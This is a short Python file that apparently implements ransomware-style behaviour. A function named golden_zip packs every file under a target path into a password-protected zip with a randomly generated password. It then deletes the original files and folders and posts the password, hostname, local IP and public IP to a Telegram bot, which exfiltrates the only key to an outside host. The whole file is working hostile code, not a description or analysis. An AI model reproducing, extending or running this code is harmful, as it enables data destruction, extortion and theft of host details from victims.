import os
import random
import string
import shutil
import requests
import socket
import pyminizip
ipme = requests.get("https://api.ipify.org").text
def generate_password(length=14):
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for i in range(length))
    return password

def zip_files(GoldenPath, GoldenFile, password):
    files = []
    for root, dirs, files_in_dir in os.walk(GoldenPath):
        for file in files_in_dir:
            file_path = os.path.join(root, file)
            if os.path.isfile(file_path):
                files.append(file_path)
    if files:
        pyminizip.compress_multiple(files, [], GoldenFile, password, 5)
    else:
        raise ValueError("No valid files found to compress")

def remove_files(GoldenPath, GoldenFile):
    for root, dirs, files in os.walk(GoldenPath):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path != GoldenFile:
                os.remove(file_path)
        for dir in dirs:
            shutil.rmtree(os.path.join(root, dir))

def get_device_info():
    device_name = socket.gethostname()
    ip_address = socket.gethostbyname(device_name)
    return device_name, ip_address

def send_telegram_message(password, GoldenToken, Goldenid, device_name, ip_address):
    message = f"password : {password}\nDevice : {device_name}\nip : {ipme}\nip_Address : {ip_address}"
    url = f"https://api.telegram.org/bot{GoldenToken}/sendMessage"
    data = {"Goldenid": Goldenid, "text": message}
    response = requests.post(url, data=data)
    return response.json()

def golden_zip(GoldenPath, GoldenFile, GoldenToken, Goldenid):
    if os.path.exists(GoldenFile):
        os.remove(GoldenFile)
    
    password = generate_password()
    zip_files(GoldenPath, GoldenFile, password)
    remove_files(GoldenPath, GoldenFile)
    device_name, ip_address = get_device_info()
    send_telegram_message(password, GoldenToken, Goldenid, device_name, ip_address)
